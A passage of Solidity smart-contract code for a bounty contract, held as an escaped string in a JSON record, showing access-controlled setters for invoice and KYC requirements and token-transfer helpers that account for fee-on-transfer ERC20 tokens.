Whether or not the Bounty is invoiceRequired\n    /// @param _invoiceRequired Whether or not the Bounty is invoiceRequired\n    function setInvoiceRequired(bool _invoiceRequired)\n        external\n        virtual\n        onlyOpenQ\n    {\n        invoiceRequired = _invoiceRequired;\n    }\n\n    /// @notice Whether or not KYC is required to fund and claim the bounty\n    /// @param _supportingDocumentsRequired Whether or not KYC is required to fund and claim the bounty\n    function setSupportingDocumentsRequired(bool _supportingDocumentsRequired)\n        external\n        virtual\n        onlyOpenQ\n    {\n        supportingDocumentsRequired = _supportingDocumentsRequired;\n    }\n\n    /// @notice Transfers _volume of both ERC20 or protocol token to _payoutAddress\n    /// @param _tokenAddress Address of an ERC20 or Zero Address for protocol token\n    /// @param _volume Volume to transfer\n    /// @param _payoutAddress Destination address\n    function _transferToken(\n        address _tokenAddress,\n        uint256 _volume,\n        address _payoutAddress\n    ) internal virtual {\n        if (_tokenAddress == address(0)) {\n            _transferProtocolToken(_payoutAddress, _volume);\n        } else {\n            _transferERC20(_tokenAddress, _payoutAddress, _volume);\n        }\n    }\n\n    /// @notice Receives _volume of ERC20 at _tokenAddress from _funder to bounty address\n    /// @param _tokenAddress The ERC20 token address\n    /// @param _funder The funder of the bounty\n    /// @param _volume The volume of token to transfer\n    function _receiveERC20(\n        address _tokenAddress,\n        address _funder,\n        uint256 _volume\n    ) internal virtual returns (uint256) {\n        uint256 balanceBefore = getERC20Balance(_tokenAddress);\n        IERC20Upgradeable token = IERC20Upgradeable(_tokenAddress);\n        token.safeTransferFrom(_funder, address(this), _volume);\n        uint256 balanceAfter = getERC20Balance(_tokenAddress);\n        require(\n            balanceAfter >= balanceBefore,\n            Errors.TOKEN_TRANSFER_IN_OVERFLOW\n        );\n\n        //// The reason we take the balanceBefore and balanceAfter rather than the raw volume\n        /// is because certain ERC20 contracts ( e.g. USDT) take fees on transfers.\n        /// Therefore the volume received after transferFrom can be lower than the raw"
    }
  ]
}